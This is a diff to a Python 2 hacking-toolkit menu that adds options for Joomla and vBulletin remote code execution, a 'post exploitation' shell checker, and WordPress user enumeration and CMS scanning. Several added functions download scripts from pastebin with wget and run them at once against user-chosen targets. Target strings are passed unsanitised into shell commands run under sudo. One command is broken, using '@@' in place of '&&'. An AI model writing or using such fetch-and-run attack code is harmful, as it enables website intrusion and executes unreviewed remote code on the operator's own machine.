@@ -4,6 +4,7 @@
 #           Authors : Fedy Wesleti , Mohamed Nour 
 #
 import sys
+import argparse
 import os
 import time
 import httplib
@@ -16,6 +17,8 @@ import glob
 import random
 import Queue 
 import threading
+import requests
+import base64
 from getpass import getpass
 from commands import *
 from sys import argv
@@ -69,6 +72,7 @@ o888o        `Y8bod8P' o888o o888o o888bood8P'  `Y8bod8P' o88'   888o v1.3
     5 : Sniffing & Spoofing
     6 : Web Hacking 
     7 : Private Tools
+    8 : Post Exploitation
     99 : Exit
 
     """)
@@ -88,12 +92,27 @@ o888o        `Y8bod8P' o888o o888o o888bood8P'  `Y8bod8P' o88'   888o v1.3
         webhack()
     elif choice == "7":
         tnn()
+    elif choice == "8":
+        postexp()
     elif choice == "99":
         clearScr(),sys.exit();
     elif choice == "":
         menu()
     else: 
         menu()
+def postexp():
+    clearScr()
+    print("1: Shell Checker")
+    print("99:Return to main menu ")
+    choice11 = raw_input("Enter Your Choice:")
+    if choice11 == "1":
+        sitechecker()
+    elif choice11 == "99":
+        menu()
+def sitechecker():
+    os.system("wget http://pastebin.com/raw/Rhgs1njB --output-document=ch01.py")
+    clearScr()
+    os.system("python ch01.py")
 def h2ip():
     host = raw_input("Select A Host : ")
     ips = socket.gethostbyname(host)
@@ -146,7 +165,9 @@ def webhack():
     print("6 : Wordpress Exploit Scanner")
     print("7 : Wordpress Plugins Scanner")
     print("8 : Shell and Directory Finder")
-    print("99 : Exit")
+    print("9 : Joomla! 1.5 - 3.4.5 remote code execution")
+    print("10: Vbulletin 5.X remote code execution")
+    print("99: Exit")
     choiceweb = raw_input("Enter Your Choice : ")
     if choiceweb == "1":
         clearScr()
@@ -165,12 +186,24 @@ def webhack():
         clearScr();wppluginscan()
     if choiceweb =="8":
         clearScr();shelltarget()
+    if choiceweb =="9":
+        clearScr();joomlarce()
+    if choiceweb =="10":
+        clearScr();vbulletinrce()
     elif choiceweb =="99":
         menu()
     elif choiceweb == "":
         menu()
     else: 
         menu() 
+def vbulletinrce():
+    os.system("wget http://pastebin.com/raw/eRSkgnZk --output-document=tmp.pl")
+    os.system("perl tmp.pl")
+def joomlarce():
+    os.system("wget http://pastebin.com/raw/EX7Gcbxk --output-document=temp.py")
+    clearScr();print("if the response is 200 , you will find your shell in Joomla_3.5_Shell.txt")
+    jmtarget=raw_input("Select a targets list :")
+    os.system("python temp.py %s"%jmtarget)
 def inurl():
     dork = raw_input("select a Dork:")
     output = raw_input("select a file to save :")
@@ -441,6 +474,8 @@ def info():
     print("2: Setoolkit")
     print("3: Port Scanning")
     print("4: Host To IP")
+    print("5: wordpress user enumeration")
+    print("6: CMS scanner")
     print("99: Back To Main Menu")
     choice2 = raw_input("Select from the menu:")
     if choice2 == "1":
@@ -451,12 +486,26 @@ def info():
         clearScr(); ports()
     if choice2 == "4":
         clearScr(); h2ip()
+    if choice2 == "5":
+        clearScr(); wpue()
+    if choice2 == "6":
+        clearScr(); cmsscan()
     elif choice2 =="99":
         clearScr(); menu()
     elif choice2 == "":
         menu()
     else: 
         menu()
+def cmsscan():
+    os.system("git clone https://github.com/Dionach/CMSmap.git")
+    clearScr();
+    xz=raw_input("select target : ") 
+    os.system("cd CMSmap @@ sudo cmsmap.py %s"%xz)
+def wpue():
+    os.system("git clone https://github.com/wpscanteam/wpscan.git")
+    clearScr();
+    xe=raw_input("Select a Wordpress target : ")
+    os.system("cd wpscan && sudo ruby wpscan.rb --url %s --enumerate u"%xe)
 def priv8():
     tnn()
 def passwd():
@@ -1283,7 +1332,5 @@ def wpminiscanner():
 if __name__ == "__main__":
   menu()
 
-    
-    
     
   
